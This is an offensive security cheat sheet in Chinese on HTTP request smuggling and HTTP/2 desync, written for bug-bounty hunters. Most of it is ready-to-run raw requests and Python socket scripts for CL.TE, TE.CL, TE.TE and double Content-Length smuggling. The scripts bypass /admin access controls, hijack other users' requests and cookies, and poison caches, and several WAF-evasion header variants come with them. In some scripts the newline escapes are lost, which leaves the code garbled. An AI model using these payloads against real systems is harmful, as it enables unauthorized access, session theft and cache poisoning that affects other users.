# HTTP Request Smuggling / HTTP/2 Desync

> 视角：黑盒，目标是利用前后端解析差异

## 1. 一句话说清

前置代理（CDN / WAF / Nginx）和后端服务器对 `Content-Length` / `Transfer-Encoding` 解析不一致 →
攻击者把"半包"塞进流，影响下个用户的请求/响应。
SRC 价值：成功的 desync = P1/P0（$2k–$10k+）。

---

## 2. 类型速览

| 类型 | 前置代理用 | 后端用 |
|------|----------|------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | 都看，但前后处理混淆 | 同 |
| **HTTP/2 → HTTP/1 desync** | h2 | h1 后端 |
| **CL.0** | CL=0 后端忽略 | 后端读 body |

---

## 3. 探测手法

### 3.1 工具

```bash
# Burp 扩展
HTTP Request Smuggler

# 命令行
smuggler.py -u https://target -v
http2smugl quirks --target target.com:443
h2csmuggler -u https://target/ --path /admin
```

### 3.2 经典 PoC

#### CL.TE

```
POST / HTTP/1.1
Host: victim
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

前端按 CL=6 读了 `0\r\n\r\nG`，后端按 chunked 看到 `0\r\n\r\n` 结束，剩下 `G` 进入下一个请求。

#### TE.CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
...
0

```

#### 双 CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Content-Length: 1

GPOST...
```

#### CL.0（HTTP/2 时常见）

后端忽略 CL（POST 当 GET 处理），前端按 CL 取走 body → 走私。

#### h2c smuggling

```bash
h2csmuggler -u http://target/ --path /admin
# 利用 HTTP/1.1 → HTTP/2 升级让前置代理失效
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 标准 CL/TE 检测 | TE 大小写：`Transfer-encoding`、`transfer-Encoding` |
| TE 拦 | TE 末尾加空格：`Transfer-Encoding : chunked` |
| WAF 检测 | TE 值变形：`chunked`、`chunked,gzip`、`xchunked` |
| 标准 chunk 拦 | 0 大小 chunk 后塞数据 |
| h2 关闭 | h2c upgrade |

---

## 5. 利用提权 / 横向

```
1. 缓存投毒：让代理把恶意响应缓存为另一 URL
2. 跨用户访问：把 admin 端点的响应"借"给下个用户
3. 旁路 IP 限制：用走私走过 IP 校验
4. 偷 secret：让别人的请求 + 自己的响应混合
5. XSS（缓存了走私响应）
```

---

## 6. 真实案例指纹

- PortSwigger blog 系列（James Kettle）
- Cloudflare / Akamai 多次披露
- HackerOne H1 上 desync 报告 $5k–$30k

通用指纹：
- 同一连接发 2 个请求，第 2 个响应"看起来是别的请求的"
- 偶尔 503 / 502 / 异常 status code
- 代理日志和后端日志请求数对不上

---

## 7. 复现 / 证据要点

### 7.1 PoC

```
# 在 Burp Repeater 用 raw 模式发送下面包（保留 CRLF）
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n\r\nG

# 立即第二个请求（同连接，Burp Repeater 同样栏）
GET / HTTP/1.1
Host: target.com

→ 第二个响应应当反映前一次走私的 'G' 前缀
```

### 7.2 CVSS

```
HTTP smuggling → 缓存投毒          = 8.1 High
HTTP smuggling → 旁路鉴权           = 9.1 Critical
HTTP smuggling → 跨用户             = 8.1 High
```

---

## 8. 不要做的事

- **禁**：在生产上做大流量 desync 测试（影响他人请求）。低速、单次验证。
- **禁**：把走私构造的恶意响应缓存到全站共享路径（其他用户会受影响）。在你自己的 cache key 上演示。
- **禁**：实际偷取他人 cookie / token。看到 desync 现象即停。

## H1 真实案例

_共 38 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | 20000 usd | PayPal | [Bypass for #488147 enables stored XSS on https://paypal.com/signin again](https://hackerone.com/reports/510152) | Bypass for #488147 enables stored XSS on https://paypal.com/signin again |
| High | 18900 usd | PayPal | [Stored XSS on https://paypal.com/signin via cache poisoning](https://hackerone.com/reports/488147) | Stored XSS on https://paypal.com/signin via cache poisoning |
| Critical | — | Slack | [Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies](https://hackerone.com/reports/737140) | Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a mon… |
| High | — | LY Corporation | [Request smuggling on admin-official.line.me could lead to account takeover](https://hackerone.com/reports/740037) | Request smuggling on admin-official.line.me could lead to account takeover |
| Critical | — | Eternal | [Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com](https://hackerone.com/reports/771666) | Intro Hi Zomato Security Team! My name is Evan Custodio and this is my first time evaluating your platform. I specialize in loo… |
| Critical | 7500 usd | Basecamp | [HTTP Request Smuggling via HTTP/2](https://hackerone.com/reports/1211724) | HTTP Request Smuggling via HTTP/2 |
| High | — | Helium | [HTTP request Smuggling](https://hackerone.com/reports/867952) | When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web … |
| Critical | 6000 usd | Cloudflare Public Bug Bounty | [HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() func…](https://hackerone.com/reports/1478633) | HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function |
| High | 750 usd | GSA Bounty | [HTTP Request Smuggling on https://labs.data.gov](https://hackerone.com/reports/726773) | Greetings, The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and b… |
| High | 4660 usd | Internet Bug Bounty | [Possibility of Request smuggling attack](https://hackerone.com/reports/2280391) | Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header |
| High | — | Node.js | [HTTP Request Smuggling due to CR-to-Hyphen conversion](https://hackerone.com/reports/922597) | NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, th… |
| Critical | 5000 usd | Aiven Ltd | [Grafana RCE via SMTP server parameter injection](https://hackerone.com/reports/1200647) | Summary: This report is similar to #1180653, except with different parameter injection entrypoint |

**命中本类的 weakness 分布：**

- HTTP Request Smuggling：27 条
- CRLF Injection：5 条
- Uncategorized → 手工归类：4 条
- HTTP Response Splitting：2 条


## Payload 库

_4 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

### CL-TE请求走私  `smuggling-cl-te`
Content-Length与Transfer-Encoding走私
子类：**CL-TE** · tags: `smuggling` `request` `http`

**前置条件：** 目标使用多层代理；前后端处理差异

**攻击链：**

**1. CL-TE基础**
_CL-TE走私_
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**2. TE-CL基础**
_TE-CL走私_
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**3. TE-TE**
_TE-TE走私_
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```

**WAF/EDR 绕过变体：**

**1. TE头混淆变体**
_通过在Transfer-Encoding头中添加空格、制表符、换行符、多重头部、拼写变体等方式使前后端代理对该头的解析产生差异，触发请求走私_
```
# TE头混淆(使前/后端对TE解析不一致):
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

X: x
Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

**2. Chunked扩展字段与CL-TE组合利用**
_利用HTTP Chunked编码的扩展字段(分号后内容)干扰解析，或通过CL-0技巧使前端认为请求无体而后端继续处理走私的第二个请求_
```
# Chunked扩展字段(RFC允许的分号后扩展):
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0;ext="injected"

G

# CL-0走私:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.com
```

---

### CL-CL走私  `smuggling-cl-cl`
利用前端代理和后端服务器同时处理Content-Length头但对多个CL头的处理差异实现HTTP请求走私
子类：**CL-CL** · tags: `smuggling` `cl-cl` `http`

**前置条件：** 存在前端代理(如HAProxy/Nginx)+后端服务器架构；两端对Content-Length头的解析存在差异；理解HTTP请求走私原理

**攻击链：**

**1. 检测CL-CL走私条件**  _[linux]_
_探测目标是否存在双CL走私条件_
```
# 检测前端代理类型:
curl -sI "http://target.com/" | grep -iE "server:|via:|x-forwarded"

# 发送包含两个Content-Length的请求:
curl -v "http://target.com/"   -H "Content-Length: 6"   -H "Content-Length: 0"   -d "test12"

# 观察响应:
# - 如果正常返回: 可能只解析了一个CL
# - 如果400/错误: 服务器拒绝多CL(安全)
# - 如果部分处理: 存在走私可能
```

**2. CL-CL请求走私POC**
_构造包含两个Content-Length的走私请求，将恶意请求注入到后端处理队列_
```
# Python POC - CL-CL走私
import socket

def smuggle_cl_cl(host, port):
    payload = (
        "POST / HTTP/1.1
"
        f"Host: {host}
"
        "Content-Length: 44
"   # 前端使用这个CL
        "Content-Length: 0
"    # 后端使用这个CL
        "
"
        "GET /admin HTTP/1.1
"  # 走私的请求
        f"Host: {host}
"
        "
"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096).decode(errors="ignore")
    print(resp)
    s.close()

smuggle_cl_cl("target.com", 80)
```

**3. 利用CL-CL走私绕过前端访问控制**
_利用CL-CL走私绕过前端代理的ACL访问限制访问/admin_
```
# 场景：前端限制/admin访问，通过走私绕过
import socket

def bypass_acl(host, port):
    # 走私请求到/admin端点
    smuggled = (
        "GET /admin HTTP/1.1
"
        f"Host: {host}
"
        "
"
    )
    content_length_real = len(smuggled)
    
    payload = (
        "POST / HTTP/1.1
"
        f"Host: {host}
"
        f"Content-Length: {content_length_real}
"
        "Content-Length: 0
"
        "Connection: keep-alive
"
        "
"
        + smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    # 接收两个响应
    resp = s.recv(8192).decode(errors="ignore")
    print("[Response 1 - Normal]")
    print(resp[:500])
    resp2 = s.recv(8192).decode(errors="ignore")
    print("[Response 2 - Smuggled /admin]")
    print(resp2[:500])
    s.close()

bypass_acl("target.com", 80)
```

**WAF/EDR 绕过变体：**

**1. HTTP/2降级绕过**
_利用HTTP/2到HTTP/1.1协议降级时前后端对请求边界解析不一致实现走私_
```
# HTTP/2 -> HTTP/1.1降级利用
# 前端H2后端H1时的走私
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

# H2C升级走私
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64>
Connection: Upgrade, HTTP2-Settings
```

**2. 连接复用操控**
_通过双Content-Length头值差异和keep-alive连接复用在代理链中走私请求_
```
# 双CL值差异
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 50

12345GPOST /admin HTTP/1.1
Host: target.com

# 利用keep-alive连接复用
GET / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 0

GET /admin HTTP/1.1
Host: internal.target.com
```

**3. 代理链混淆**
_利用多级代理对Content-Length头中空格和冒号处理差异实现请求走私_
```
# 多级代理CL处理差异
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Content-Length : 0

GET /admin HTTP/1.1
Host: target.com
X: 1

# 空格混淆CL头
POST / HTTP/1.1
Host: target.com
 Content-Length: 0
Content-Length: 42

GET /internal HTTP/1.1
Host: target.com
```

---

### TE-CL走私  `smuggling-te-cl`
利用前端使用Transfer-Encoding而后端使用Content-Length的差异实现HTTP请求走私
子类：**TE-CL** · tags: `smuggling` `te-cl` `http`

**前置条件：** 前端代理优先处理Transfer-Encoding；后端服务器优先处理Content-Length；理解chunked编码格式

**攻击链：**

**1. 检测TE-CL差异**
_检测前端和后端对TE vs CL的优先级差异_
```
# 发送同时包含TE和CL的请求:
curl -v "http://target.com/"   -H "Transfer-Encoding: chunked"   -H "Content-Length: 3"   -d "0

"

# 使用timing检测:
# 如果后端使用CL，会等待更多数据(超时)
import socket, time

s = socket.socket()
s.connect(("target.com", 80))
payload = (
    "POST / HTTP/1.1
"
    "Host: target.com
"
    "Transfer-Encoding: chunked
"
    "Content-Length: 6
"
    "
"
    "0

"
)
s.send(payload.encode())
start = time.time()
resp = s.recv(4096)
elapsed = time.time() - start
print(f"Response in {elapsed:.2f}s")
# 快速响应=后端用TE, 延迟响应=后端用CL
```

**2. TE-CL走私POC**
_TE-CL走私：前端按chunked处理转发整个body，后端按CL只读取部分，剩余变为走私请求_
```
import socket

def te_cl_smuggle(host, port):
    # 前端(TE): 读取到"0

"结束 → 整个payload是一个请求
    # 后端(CL): 只读取Content-Length指定的字节 → 剩余字节是新请求
    
    smuggled = "GET /admin HTTP/1.1
Host: {}

".format(host)
    
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: 4
"
        "Transfer-Encoding: chunked
"
        "
"
        "{}
"
        "{}"
        "0

"
    ).format(host, format(len(smuggled), "x"), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

te_cl_smuggle("target.com", 80)
```

**3. TE-CL走私实现请求劫持**
_走私不完整的POST请求，使下一个用户的请求内容(含Cookie)被反射到搜索结果中_
```
# 利用走私劫持下一个用户的请求
import socket

def hijack_request(host, port):
    # 走私一个不完整的POST请求
    # 下一个正常用户的请求会被拼接为这个POST的body
    smuggled = (
        "POST /search HTTP/1.1
"
        "Host: {}
"
        "Content-Type: application/x-www-form-urlencoded
"
        "Content-Length: 200
"  # 大CL会吞噬下一个请求
        "
"
        "q="  # 下一个请求的数据会被当作搜索参数
    ).format(host)
    
    chunk_size = format(len(smuggled), "x")
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: 4
"
        "Transfer-Encoding: chunked
"
        "
"
        "{}
"
        "{}"
        "0

"
    ).format(host, chunk_size, smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    print(s.recv(4096).decode(errors="ignore")[:500])
    s.close()

hijack_request("target.com", 80)
```

**WAF/EDR 绕过变体：**

**1. TE头大小写变体绕过**
_利用不同代理对Transfer-Encoding头名大小写和值处理的差异绕过TE-CL走私检测_
```
# TE头大小写混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Transfer-Encoding变体
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
```

**2. 空白字符注入**
_在Transfer-Encoding头中注入制表符、前导空格和CRLF字符，使不同代理解析不同_
```
# 制表符/换行注入TE头
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding:\tchunked

# 行前空格混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
 Transfer-Encoding: chunked

# CRLF注入变体
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked\x0d\x0aX-Ignore: x
```

**3. chunk扩展字段利用**
_利用HTTP分块传输中chunk-extension字段和非标准chunk大小格式造成前后端解析差异_
```
# chunk扩展混淆
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5;ext=val
hello
0


# 超长chunk扩展
5;aaaaaaa...aaaa=bbbb...bbb
hello
0


# 非法chunk大小格式
 5
hello
0


# 0x前缀
0x5
hello
0
```

---

### TE-TE走私  `smuggling-te-te`
利用前端和后端对Transfer-Encoding头的不同混淆变体的处理差异实现请求走私
子类：**TE-TE** · tags: `smuggling` `te-te` `http`

**前置条件：** 前后端都支持Transfer-Encoding；可以通过TE头混淆使一端忽略TE；了解chunked编码和HTTP走私原理

**攻击链：**

**1. TE混淆变体探测**
_测试各种Transfer-Encoding混淆变体，寻找前后端解析差异_
```
# Transfer-Encoding的各种混淆写法:
# 测试哪种混淆能让一端忽略TE
import socket

te_variants = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",     # 冒号前空格
    "Transfer-Encoding: chunked
Transfer-encoding: cow",  # 两个TE
    "Transfer-Encoding	: chunked",    # Tab分隔
    "Transfer-Encoding: 	chunked",    # Tab前缀
    " Transfer-Encoding: chunked",     # 行首空格
    "X: x
Transfer-Encoding: chunked",  # Header注入
    "Transfer-Encoding: chunked\x00",  # 空字节
]

for i, te in enumerate(te_variants):
    print(f"[{i}] Testing: {te[:60]}")
    payload = (
        "POST / HTTP/1.1
"
        "Host: target.com
"
        f"{te}
"
        "Content-Length: 5
"
        "
"
        "0

"
    )
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("target.com", 80))
        s.send(payload.encode())
        resp = s.recv(1024).decode(errors="ignore")
        status = resp.split("
")[0] if resp else "No response"
        print(f"    → {status}")
        s.close()
    except Exception as e:
        print(f"    → Error: {e}")
```

**2. TE-TE走私利用(前端忽略混淆TE)**
_利用TE头混淆使一端按CL、另一端按TE处理，实现走私_
```
import socket

def te_te_smuggle(host, port, te_header):
    # 前端不识别混淆的TE → 使用CL
    # 后端识别混淆的TE → 使用chunked
    
    smuggled = "GET /admin HTTP/1.1
Host: {}

".format(host)
    
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: {}
"
        "{}
"
        "
"
        "0
"
        "
"
        "{}"
    ).format(
        host,
        len("0

" + smuggled),
        te_header,
        smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

# 使用发现的有效混淆变体:
te_te_smuggle("target.com", 80, "Transfer-Encoding: chunked
Transfer-encoding: cow")
```

**3. TE-TE缓存投毒攻击**
_利用TE-TE走私实现Web缓存投毒攻击_
```
import socket

def cache_poison_via_smuggling(host, port):
    # 通过走私实现缓存投毒:
    # 走私的请求指向静态资源，但包含恶意响应头/内容
    
    smuggled = (
        "GET /static/main.js HTTP/1.1
"
        "Host: {}
"
        "
"
    ).format(host)
    
    # 先发送走私请求
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: {}
"
        "Transfer-Encoding: chunked
"
        "Transfer-encoding: x
"
        "
"
        "0
"
        "
"
        "{}"
    ).format(host, len("0

" + smuggled), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print("[*] Cache poisoned")
    print(resp.decode(errors="ignore")[:300])
    s.close()

cache_poison_via_smuggling("target.com", 80)
```

**WAF/EDR 绕过变体：**

**1. 多重TE头混淆**
_发送多个Transfer-Encoding头或逗号分隔多值，利用前后端对多值TE头的优先级差异_
```
# 多个Transfer-Encoding头
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked

# 逗号分隔多值
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked

# 混合有效无效值
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked
```

**2. 非标准TE值混淆**
_使用非标准或被篡改的Transfer-Encoding值，使前端代理回退到CL而后端仍解析为chunked_
```
# 垃圾TE值使某些代理忽略TE
Transfer-Encoding: xchunked
Transfer-Encoding: chunked-false
Transfer-Encoding: chunk
Transfer-Encoding: CHUNKED

# 引号包裹
Transfer-Encoding: "chunked"

# 参数附加
Transfer-Encoding: chunked; q=0.5
Transfer-Encoding: chunked, x

# 编码混淆
Transfer-\x45ncoding: chunked
```

**3. 代理特定解析绕过**
_针对特定代理/服务器（HAProxy/Apache/Nginx）的TE头解析特性发送定制化走私payload_
```
# HAProxy特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:[\x0b]chunked

# Apache特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:\x00chunked

# Nginx特定绕过
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked\x20

# 通用尾部空白
Transfer-Encoding: chunked
```

---
